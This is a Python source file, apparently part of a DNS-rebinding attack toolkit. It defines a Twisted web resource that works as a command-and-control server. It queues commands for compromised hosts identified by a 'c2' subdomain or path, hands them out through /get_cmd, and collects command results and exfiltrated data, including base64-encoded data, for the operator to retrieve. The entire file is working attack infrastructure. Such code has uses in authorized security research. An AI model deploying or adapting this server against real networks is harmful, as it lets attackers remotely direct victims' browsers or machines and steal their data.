import json
import time
import base64

from twisted.web.resource import Resource

cmd_queue = {}
result_queue = {}
data_queue = {}

class RebindPage(Resource):
    isLeaf = True

    def get_c2(self, request):
        hostname = request.getRequestHostname().decode()
        path = request.path.decode()
        if hostname.startswith("c2"):
            return (hostname.split(".")[0], path)
        return (path.split("/")[1], "/" + "/".join(path.split("/")[2:]))

    def render_POST(self, request):
        hostid, path = self.get_c2(request)
        result_queue.setdefault(hostid, {})
        cmd_queue.setdefault(hostid, [])
        data_queue.setdefault(hostid, {})
        response = b''

        request_body = request.content.read().decode()
        if path.startswith("/put_cmd"):
            try:
                request.responseHeaders.addRawHeader(b"content-type", b"application/json")
                id = int(time.time())
                jscmd = json.loads(request_body)
                cmd = jscmd["cmd"]
                foreground = "true" if jscmd.get("foreground", True) else "false"

                cmd_queue[hostid].append((id, foreground, cmd))
                result_queue[hostid][id] = None
                response = json.dumps({"id": id}).encode()
            except (json.decoder.JSONDecodeError, KeyError):
                request.setResponseCode(500)

        elif path.startswith("/put_result"):
            try:
                id = int(path.split("/")[2])
                if len(request_body) > 0:
                    result_queue[hostid][id] = request_body
                else:
                    result_queue[hostid][id] = "<No data received>"
                request.setResponseCode(204)
            except (IndexError, ValueError):
                request.setResponseCode(500)

        elif path.startswith("/put_data"):
            id = int(time.time())
            if len(request_body) > 0:
                data_queue[hostid][id] = request_body
            else:
                data_queue[hostid][id] = "<No data received>"
            request.setResponseCode(204)

        elif path.startswith("/put_b64data"):
            id = int(time.time())
            if len(request_body) > 0:
                data_queue[hostid][id] = base64.b64decode(request_body).decode()
            else:
                data_queue[hostid][id] = "<No data received>"
            request.setResponseCode(204)

        else:
            request.setResponseCode(404)
        return response

    def render_GET(self, request):
        hostid, path = self.get_c2(request)
        result_queue.setdefault(hostid, {})
        cmd_queue.setdefault(hostid, [])
        data_queue.setdefault(hostid, {})
        response = b''

        if path.startswith("/clear"):
            result_queue[hostid].clear()
            cmd_queue[hostid].clear()
            data_queue[hostid].clear()
            request.setResponseCode(204)
        elif path.startswith("/get_result"):
            request.responseHeaders.addRawHeader(b"content-type", b"application/json")
            try:
                id = int(path.split("/")[2])
                if result_queue[hostid][id] is not None:
                    response = json.dumps({"state": "complete", "result" : result_queue[hostid][id]}).encode()
                    del result_queue[hostid][id]
                else:
                    response = json.dumps({"state": "pending"}).encode()
            except (IndexError, ValueError, KeyError) as e:
                request.setResponseCode(500)
                response = str(e).encode()

        elif path.startswith("/get_data"):
            if len(data_queue[hostid]):
                response = json.dumps(data_queue[hostid]).encode()
                data_queue[hostid].clear()
            else:
                request.setResponseCode(204)

        elif path.startswith("/get_cmd"):
            if len(cmd_queue[hostid]):
                response = "{0},{1},{2}".format(*cmd_queue[hostid].pop(0)).encode()
            else:
                request.setResponseCode(204)

        else:
            request.setResponseCode(404)

        return response

def get_resource(request):
    return RebindPage()

